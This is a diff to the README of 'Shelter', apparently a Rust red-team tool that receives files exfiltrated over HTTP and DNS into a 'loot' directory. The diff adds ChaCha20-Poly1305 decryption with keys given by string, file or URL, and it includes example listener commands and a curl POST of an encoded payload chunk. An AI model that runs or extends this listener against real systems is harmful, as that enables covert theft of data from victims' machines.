@@ -63,6 +63,9 @@ shelter [OPTIONS] <COMMAND>
 
 **Global Arguments:**
 - `--output-dir <PATH>` — Directory where reconstructed files are stored (default: `loot`)
+- `--cipher-key-string <KEY>` — Cipher key as a plain string for decrypting received files encrypted with ChaCha20-Poly1305
+- `--cipher-key-file <PATH>` — Path to a file containing the cipher key for decrypting received files
+- `--cipher-key-url <URL>` — URL to fetch the cipher key for decrypting received files
 
 ### HTTP Server Subcommand
 
@@ -87,6 +90,15 @@ cargo run -- http-server -l 0.0.0.0:9000 --output-dir /var/exfil
 
 # Listen on specific interface
 cargo run -- http-server -l 192.168.1.100:8080
+
+# With encryption support using string key
+cargo run -- http-server -l 0.0.0.0:8080 --cipher-key-string "32-byte-encryption-key-here!"
+
+# With encryption support using key file
+cargo run -- http-server --cipher-key-file /etc/shelter/cipher.key --output-dir /var/loot
+
+# With encryption support using remote key
+cargo run -- http-server --cipher-key-url https://keyserver.internal/get-key
 ```
 
 ### DNS Server Subcommand
@@ -116,6 +128,15 @@ cargo run -- dns-server -p tcp -l 0.0.0.0:53 -d exfil.internal
 
 # Custom setup with specific output directory
 cargo run -- dns-server -l 127.0.0.1:1053 -d company.exfil --output-dir ./dns-loot
+
+# With encryption support using string key
+cargo run -- dns-server -p tcp -l 0.0.0.0:53 --cipher-key-string "32-byte-encryption-key-here!"
+
+# With encryption support using key file
+cargo run -- dns-server --cipher-key-file /etc/shelter/cipher.key --output-dir ./dns-loot
+
+# With encryption support using remote key
+cargo run -- dns-server -d internal.dns --cipher-key-url https://keyserver.internal/get-key
 ```
 
 ---
@@ -142,11 +163,22 @@ The decoded payload (after hex and base64 decoding) follows this format:
 
 **Root Node** (marks the start of file transmission):
 ```
-r:filename:file_id
+r:filename:file_id[:metadata]
 ```
 - `r` — Node type identifier (root node)
 - `filename` — Original filename of exfiltrated file
 - `file_id` — Unique identifier correlating chunks to this root node
+- `metadata` (optional) — Metadata tags separated by pipes (`|`), including encryption info:
+  - `c-s` — Encrypted with ChaCha20-Poly1305 using cipher key string
+  - `c-f` — Encrypted with ChaCha20-Poly1305 using cipher key file
+  - `c-u` — Encrypted with ChaCha20-Poly1305 using cipher key from URL
+
+**Examples:**
+```
+r:secret.txt:abc123
+r:encrypted_file.bin:xyz789:c-s
+r:config.json:id123:c-f|additional-metadata
+```
 
 **File Chunk** (regular data chunk):
 ```
@@ -206,6 +238,29 @@ curl -X POST http://127.0.0.1:8080/ \
   -H "Content-Type: text/plain" \
   -d "3665cd5665726f6f743a0d6361636865643a616263313233"
 ```
+
+#### Encryption Handling
+
+The server automatically detects and decrypts received files based on metadata flags specified in the root node.
+
+**Decryption Process:**
+
+1. **Detection** — Server parses the root node's metadata to identify encryption type
+2. **Key Retrieval** — Based on encryption type, the server obtains the cipher key:
+   - `c-s` — Uses the key provided via `--cipher-key-string` flag
+   - `c-f` — Reads the key from the file path specified by `--cipher-key-file` flag
+   - `c-u` — Fetches the key from the URL specified by `--cipher-key-url` flag
+3. **Cipher Setup** — Initializes ChaCha20-Poly1305 cipher with:
+   - **Key**: The cipher key (must be 32 bytes)
+   - **Nonce**: Derived from filename and file identifier (`filename:file_id`, last 12 bytes)
+4. **Decryption** — Decrypts assembled file data; on failure, logs error and keeps file as-is
+5. **Storage** — Saves decrypted file to the loot directory
+
+**Key Requirements:**
+- All three cipher key options (`--cipher-key-string`, `--cipher-key-file`, `--cipher-key-url`) are optional
+- If a file arrives with encryption metadata but no matching cipher key flag is provided, the server logs a warning and stores the encrypted file as-is
+- ChaCha20-Poly1305 cipher keys must be exactly 32 bytes when provided as strings
+- The nonce is automatically derived from the filename and file identifier, requiring no additional configuration
 
 #### Error Codes
 
@@ -310,6 +365,37 @@ On successful decoding and queuing, server responds with:
 ```
 
 TTL is set to 60 seconds; the "ACK" value confirms receipt but is not cryptographically significant.
+
+#### Encryption Handling
+
+The DNS server supports the same encryption handling as the HTTP server. Files transmitted via DNS queries can be encrypted with ChaCha20-Poly1305, and the server will automatically decrypt them based on metadata flags.
+
+**Metadata in DNS Payloads:**
+
+Encryption metadata is included in the root node using the same format as HTTP:
+
+```
+r:filename:file_id:c-s
+r:filename:file_id:c-f
+r:filename:file_id:c-u
+```
+
+Where:
+- `c-s` — Encrypted using cipher key string (via `--cipher-key-string` flag)
+- `c-f` — Encrypted using cipher key file (via `--cipher-key-file` flag)
+- `c-u` — Encrypted using cipher key from URL (via `--cipher-key-url` flag)
+
+**Decryption Process:**
+
+The decryption process for DNS-transmitted files is identical to HTTP:
+
+1. **Detection** — Root node metadata identifies encryption type
+2. **Key Retrieval** — Server obtains cipher key from the configured source
+3. **Cipher Setup** — Initializes ChaCha20-Poly1305 with derived nonce
+4. **Decryption** — Decrypts assembled file data after all chunks are received
+5. **Storage** — Saves decrypted file to the loot directory
+
+Files with encryption metadata but no matching cipher key flag are stored encrypted as-is, with errors logged.
 
 ---
 
@@ -655,8 +741,8 @@ Shelter uses a **producer-consumer** pattern:
 
 ### High Priority
 
-- [ ] **Encryption Support**: Implement ChaCha20 encryption/decryption for payload confidentiality
-  - [ ] **Key Management**: Support key files, command-line keys, or remote key retrieval
+- [x] **Encryption Support**: Implement ChaCha20 encryption/decryption for payload confidentiality
+  - [x] **Key Management**: Support key files, command-line keys, or remote key retrieval
 - [ ] **Configuration File Support**: Implement `.toml` or `.json` configuration file parsing with clear precedence rules (CLI args > config file > defaults)
 - [ ] **Dead-Letter Queue (DLQ)**: Create a persistent or in-memory queue for file portions that fail parsing/channel send to prevent silent data loss
 - [ ] **Circuit Breaker Pattern**: Implement circuit breaker in event_handler loop to prevent infinite retries on persistent failures (e.g., disk full, permission denied)
@@ -672,17 +758,9 @@ Shelter uses a **producer-consumer** pattern:
 - [ ] **TLS/HTTPS Support**: Enable encrypted transport with configurable certificate paths and optional client certificate validation
 - [ ] **DNS EDNS0 Extension Support**: Handle EDNS0 to increase DNS payload size beyond 512 bytes, improving throughput
 - [ ] **Authentication & Authorization**: Add API key, mutual TLS, or basic auth to restrict access to authorized agents only
-- [ ] **Metrics & Monitoring**: Export Prometheus metrics for:
-  - Number of files completed
-  - Number of chunks received and reassembled
-  - Error rates by type
-  - Channel capacity utilization
-  - Assembly latency percentiles
-- [ ] **Metrics Dashboard**: Grafana dashboard for real-time monitoring of exfiltration progress
 - [ ] **Resume Capability**: Persist metadata of received chunks to allow resumption of interrupted transfers (graceful recovery)
 - [ ] **Batch Processing**: Support receiving multiple files in parallel with configurable concurrency limits to prevent memory exhaustion
 - [ ] **Compression Support**: Add optional gzip/deflate decompression for payload optimization and reduced network footprint
-- [ ] **Checksum Verification**: Add optional MD5/SHA256 checksums in payload to verify file integrity post-reassembly
 
 ### Lower Priority
 
@@ -696,6 +774,7 @@ Shelter uses a **producer-consumer** pattern:
 - [ ] **Multi-Zone DNS Support**: Support exfiltration across multiple DNS zones with per-zone configuration
 - [ ] **Rate Limiting**: Implement per-source rate limiting to prevent DoS from agents or scanning
 - [ ] **IPv6 Support**: Ensure full IPv6 compatibility for both HTTP and DNS transports
+- [ ] **Checksum Verification**: Add optional MD5/SHA256 checksums in payload to verify file integrity post-reassembly
 
 ### Research & Enhancement
 
